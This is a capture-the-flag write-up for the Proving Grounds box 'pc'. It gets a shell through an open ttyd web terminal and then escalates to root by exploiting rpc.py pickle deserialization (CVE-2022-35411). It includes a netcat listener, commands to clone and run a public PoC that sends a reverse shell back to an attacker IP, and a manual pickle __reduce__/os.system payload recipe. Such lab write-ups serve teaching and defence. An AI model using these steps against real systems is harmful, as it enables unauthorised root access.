# pc — Proving Grounds

> [!abstract] Summary
> "pc" exposes a **ttyd** web terminal (port 8000) that drops you straight into an interactive shell as a low-privileged user — no exploit needed for the foothold. Enumeration (`ps -elf`) finds a Python app in `/opt` built on the **`rpc.py` (rpcpy)** framework, served by **Uvicorn** on port 65432. `rpc.py` ≤ 0.6.0 is vulnerable to **insecure deserialization (CVE-2022-35411)**: sending a request with the header `serializer: pickle` makes the service unpickle attacker data → RCE. Because the service runs as **root**, the public PoC yields a root shell.

**Target:** `192.168.142.210`

## Methodology

1. Scan all TCP ports; identify ttyd (8000) and the Uvicorn app (65432).
2. Use the ttyd web terminal for a direct user shell.
3. Enumerate processes; identify the `rpc.py`/Uvicorn service on 65432.
4. Exploit `rpc.py` pickle deserialization (CVE-2022-35411) → root.

## Foothold — ttyd web terminal (port 8000)

Browse `http://192.168.142.210:8000/`. ttyd serves a fully interactive terminal in the browser — it drops straight into a shell as a low-privileged user, so **no separate exploit is needed** for the foothold. The user flag is available from here.

> [!note] ttyd (and its `snap`-packaged terminal) simply shares a shell over the browser. Treat it as a normal shell and start enumerating.

## Enumeration — the Uvicorn / rpc.py service

From the ttyd shell, look at running processes:

```
ps -elf
```

A Python script runs from `/opt`. Reading it shows an `rpc.py` (rpcpy) ASGI application launched under Uvicorn on port 65432:

```python
# /opt/... (rpc.py app)
app = RPC(mode="ASGI")

@app.register
def none(): ...
@app.register
def sayhi(name: str) -> str:
    return f"hi {name}"
@app.register
async def yield_data(max_num: int): ...
@app.register
def query_dict(value: str): ...

uvicorn.run(app, interface="asgi3", port=65432)
```

The framework is **`rpc.py`**. Check its version — it is **≤ 0.6.0**, vulnerable to CVE-2022-35411.

## Privilege escalation — rpc.py pickle deserialization (CVE-2022-35411)

> [!info] Vulnerability
> `rpc.py` through 0.6.0 chooses its (de)serializer from the request's `serializer:` HTTP header. JSON is the default, but a client can send `serializer: pickle`, and the server will **`pickle.loads()`** the request body. A crafted pickle executes arbitrary code via its `__reduce__` method. Here the service runs as **root**, so this is a direct root RCE.

Use the public PoC (fuzzlove/CVE-2022-35411). Set the callback to your Kali IP and start a listener — the shell comes back on TCP 9091 in the reference run:

```
# listener
nc -nvlp 9091

# run the PoC against the rpc.py service (edit LHOST/LPORT inside)
git clone https://github.com/fuzzlove/CVE-2022-35411
cd CVE-2022-35411
python3 CVE-2022-35411.py http://192.168.142.210:65432/sayhi <KALI_IP> 9091
```

The PoC POSTs a pickle payload with the `serializer: pickle` header to one of the registered RPC methods (e.g. `/sayhi`); the service unpickles it and executes the embedded reverse shell as **root**. Catch the shell and read `/root/proof.txt`.

> [!tip] Manual version
> The payload is a pickle whose `__reduce__` returns `(os.system, ("<reverse shell>",))`, base64/serialized and POSTed with headers `Content-Type: text/plain` and `serializer: pickle` to `http://<ip>:65432/<method>`.

## Lessons learned

- A ttyd terminal on a web port is often an intentional, unauthenticated foothold — open it in a browser before reaching for exploits. Easy user, but only one flag (root) on this box, so the real work is the privesc.
- After a foothold, `ps -elf` / `ps aux` to find locally-bound services (the Uvicorn app on 65432). Internal services running as root are prime privesc targets.
- `rpc.py` ≤ 0.6.0 trusts the client's `serializer:` header and will `pickle.loads()` untrusted input (CVE-2022-35411) — a textbook insecure-deserialization RCE. Any framework that deserializes client-controlled data with pickle is suspect.
- Identify the exact framework/version of odd Python services; it maps straight to the CVE.
